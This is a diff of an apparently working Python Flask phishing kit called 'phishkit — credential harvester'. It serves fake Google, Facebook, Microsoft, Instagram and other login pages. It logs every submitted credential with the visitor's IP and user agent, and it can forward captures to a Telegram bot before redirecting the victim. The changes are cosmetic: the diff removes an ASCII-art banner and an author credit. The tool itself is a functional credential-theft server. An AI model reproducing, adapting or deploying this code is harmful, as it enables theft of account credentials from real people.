@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python3
 """
 phishkit — credential harvester
@@ -17,45 +18,6 @@ import config
 
 init(autoreset=True)
 
-BANNER_ART = r"""
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⡤⢤⣀⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢀⣠⢶⠞⢩⣧⡨⠿⠿⢿⡝⠯⠛⠶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⡀⢀⣶⠟⠍⠁⢒⠿⡠⠖⠉⠉⢙⣷⠀⠀⢀⡈⠩⣲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⢦⡿⣥⡖⣲⣿⣿⣞⣁⣀⠔⠘⠻⠙⠷⡈⡆⠘⢷⡌⠉⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⢰⡿⣟⣶⣿⣿⣿⠋⣹⠟⠁⠰⣌⠀⠀⡀⠀⠈⠀⠀⣻⠀⣌⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⣿⡇⡸⣾⣿⣿⡇⣸⡏⣵⣟⣞⣿⣇⢡⠀⢺⢪⠷⢪⡵⡯⢜⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠐⡿⢰⢁⣟⠀⠉⠰⠑⣨⡶⣶⠷⣦⠻⡸⣥⢳⡚⠀⠨⢍⢛⣡⢾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⣷⢸⢸⢷⡰⢤⠾⠐⣁⠀⢇⠸⢹⠁⣟⣷⣼⢔⢐⠐⣮⡨⣜⣹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⢿⣿⡠⣼⡝⢦⠣⠁⠀⠉⠙⠘⠈⠀⠈⠈⣿⡚⠄⠂⡉⢨⣿⠲⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠈⢧⠙⣤⢇⠘⣧⡀⠀⠀⠀⠀⠀⠀⠂⠑⢽⡄⢂⢠⣵⢷⠃⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠸⠺⣞⠝⣇⣿⠙⢦⡀⠀⠈⠙⠶⠖⠂⣿⡀⢔⡭⢣⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
-⠀⠀⢀⡤⠶⠶⠿⢿⣿⡇⠀⠀⠈⠓⠤⣤⡤⠖⠘⠩⠊⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⡴⠋⠀⠀⠀⠀⠀⠙⢓⠤⠄⣀⡀⠀⢸⣷⣶⡯⠤⠚⠒⠒⠢⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢸⠃⠀⠀⠀⠀⠀⢀⢇⡀⠝⡆⡒⠒⠒⠻⠧⣄⠀⠀⢀⠢⠤⠤⢄⣹⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⡚⠀⠀⠀⠀⠀⠀⡸⠋⠀⠁⣿⡀⠀⠀⠀⠀⢧⡀⠁⠄⠀⠀⠀⠀⠙⢿⡉⠐⡀⠂⠀⠀⠀⠀⠠⠂⠀⠀
-⢹⠀⠀⠀⠀⠀⢠⠇⠀⣴⢛⡡⢗⣭⣓⣦⡀⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⡽⢧⣬⠠⠀⠀⠀⠀⠁⠀⠀⠀
-⠀⣇⠀⠀⠀⠀⢸⡀⣼⡽⢋⡜⠂⠨⠽⣿⣷⡷⡤⡈⢻⠀⠀⠀⠀⠀⡜⣁⣾⢯⠳⣴⠀⠀⠀⠀⠠⠁⠀
-⠀⠻⡄⠀⠀⠀⠀⢏⢛⣾⣷⠻⠡⢃⠎⡋⡋⢻⣋⣙⣿⣅⣀⣀⡴⢪⡎⡷⣁⠞⡢⣹⠀⢀⠀⠀⠄⠀⠀
-⠀⠀⣷⠀⠀⠀⠀⠈⡦⣳⢿⢿⠫⠆⡮⢻⣫⣔⣫⡿⠟⣀⡠⣄⢹⡽⣢⢟⠝⠈⢴⣿⠀⡀⠀⠀⠂⠀⠀
-⠀⠀⠹⡄⠀⠀⠀⠀⢸⠙⢻⢾⣒⡭⣕⠭⢿⡵⠞⠉⠁⠀⠀⠈⠳⣷⣍⡉⣗⣿⢿⠏⠀⠀⠀⠀⠄⠀⠀
-⠀⠀⡀⢥⠀⠀⠀⠀⢸⣏⣉⣚⣁⣀⠕⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡿⡛⠛⠊⠁⠀⠀⠀⠀⠀⠄⠀⠀
-⠀⠀⠀⢸⡄⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣧⠄⠀⠀⠀⠀⠀⠀⠀⠀⠄⠈⠀
-⠀⠈⠀⠈⣷⠀⠀⠀⠀⡹⣿⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠛⢧⡈⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣿⠄⠀⠀⠀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠱⣄⠀⠀⠠⢀⠀⠀⠐⠀⠀
-⠀⠀⠀⠀⠭⠄⠀⠀⡰⠏⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⢻⡄⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠸⡆⠀⢰⠁⠀⠀⠈⠥⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⡄⠀⠋⣷⣄⠀⠀⠨⠀⠄
-⠀⠀⠀⠀⠀⢻⣄⣮⠀⠀⠀⠀⠈⠪⢑⠁⠀⡀⠀⠀⠀⡀⡀⠀⠀⠀⣀⣀⠄⠂⠀⢠⡿⠊⠻⣤⠀⠀⠀
-⠀⠀⠀⠀⠀⠈⣿⠃⠀⠀⠀⠀⠀⠀⠀⠑⢦⣀⢥⡅⠒⠚⠛⠉⠁⠉⠋⠓⠀⣀⠴⡏⠇⠀⠀⠨⠳⡀⠀
-⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢜⢿⣿⣿⠟⢫⣙⣛⡿⢟⡻⢿⢭⣉⢽⠑⠀⠀⠀⠀⠀⠰⠀
-⠀⠀⠀⠀⢰⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠹⣷⣾⣾⣿⢾⣚⣯⣞⢦⢂⡮⡸⠈⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣺⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣶⣾⣟⣩⢶⡪⣂⢊⠁⠀⠀⠀⠀⠀⠀⠀⢃
-⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠸⢻⣯⣷⡫⢡⠶⠡⠀⠀⠀⠀⠀⠀⠀⠀⢸
-⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⠖⣱⡏⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
-⠀⠀⠀⠀⣺⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠽⣧⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠸⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠙⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-"""
-
 app = Flask(__name__, template_folder="templates", static_folder="static")
 
 CAPTURE_DIR = "captured"
@@ -63,20 +25,17 @@ LOG_DIR = "logs"
 os.makedirs(CAPTURE_DIR, exist_ok=True)
 os.makedirs(LOG_DIR, exist_ok=True)
 
-CURRENT_TEMPLATE = "google"  # set at runtime
+CURRENT_TEMPLATE = "google"
 
 
 def log_hit(data: dict):
     ts = datetime.datetime.utcnow().isoformat()
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ua = request.headers.get("User-Agent", "unknown")
-
     record = {"time": ts, "ip": ip, "ua": ua, **data}
-
     fname = os.path.join(CAPTURE_DIR, f"{CURRENT_TEMPLATE}_{ts[:10]}.log")
     with open(fname, "a") as f:
         f.write(json.dumps(record) + "\n")
-
     print(f"{Fore.GREEN}[+] CAPTURE{Style.RESET_ALL} {ip} -> {data}")
 
     if config.CAPTURE_MODE == "telegram" and config.TELEGRAM_BOT_TOKEN:
@@ -107,12 +66,12 @@ def index():
     return render_template(f"{CURRENT_TEMPLATE}/index.html")
 
 
-@app.route("/viral")
+@app.route("/viral", methods=["GET"])
 def viral_landing():
     return render_template("viral/index.html")
 
 
-@app.route("/viral/login")
+@app.route("/viral/login", methods=["GET"])
 def viral_login():
     return render_template("viral/login.html")
 
@@ -122,12 +81,9 @@ def login():
     data = {}
     for k, v in request.form.items():
         data[k] = v
-
     if not data:
         data = request.get_json(silent=True) or {}
-
     log_hit(data)
-
     return redirect(config.REDIRECT_URL, code=302)
 
 
@@ -138,20 +94,16 @@ def static_files(path):
 
 def main():
     global CURRENT_TEMPLATE
-
     parser = argparse.ArgumentParser(description="phishkit — credential harvester")
     parser.add_argument("-t", "--template", default="google",
                         choices=["google", "facebook", "messenger", "viral", "microsoft", "instagram", "generic"],
                         help="Login page template to serve")
-    parser.add_argument("-p", "--port", type=int, default=config.PORT,
-                        help="Port to listen on")
+    parser.add_argument("-p", "--port", type=int, default=config.PORT, help="Port to listen on")
     parser.add_argument("--host", default=config.HOST, help="Bind address")
     parser.add_argument("--tls", action="store_true", help="Enable HTTPS (self-signed)")
     args = parser.parse_args()
-
     CURRENT_TEMPLATE = args.template
 
-    print(BANNER_ART)
     banner = f"""
 {Fore.CYAN}phishkit{Style.RESET_ALL} — credential harvester
 Template : {Fore.YELLOW}{args.template}{Style.RESET_ALL}
@@ -159,15 +111,13 @@ Bind     : {args.host}:{args.port}
 Capture  : {Fore.GREEN}{config.CAPTURE_MODE}{Style.RESET_ALL}
 Redirect : {config.REDIRECT_URL}
 Captures : ./captured/
-{Fore.MAGENTA}made by ←→ Ace{Style.RESET_ALL}
 """
     print(banner)
     print(f"{Fore.GREEN}[*] Server running. Ctrl+C to stop.{Style.RESET_ALL}\n")
 
     if args.tls:
         if not (os.path.exists(config.TLS_CERT) and os.path.exists(config.TLS_KEY)):
-            print(f"{Fore.RED}[!] TLS cert/key not found. Generate first:{Style.RESET_ALL}")
-            print("    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes")
+            print(f"{Fore.RED}[!] TLS cert/key not found.{Style.RESET_ALL}")
             sys.exit(1)
         app.run(host=args.host, port=args.port, ssl_context=(config.TLS_CERT, config.TLS_KEY))
     else:
